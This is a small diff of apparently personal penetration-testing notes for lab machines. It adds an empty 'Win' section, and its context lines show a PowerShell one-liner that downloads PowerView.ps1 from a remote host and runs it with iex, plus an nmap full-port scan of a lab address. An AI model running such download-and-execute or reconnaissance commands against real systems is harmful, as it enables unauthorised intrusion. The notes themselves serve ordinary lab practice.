@@ -108,6 +108,11 @@ iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
 ```
 
 
+# Win
+```
+```
+
+
 # Win-Jerry
 ```
 nmap -p- -T5 10.10.10.95
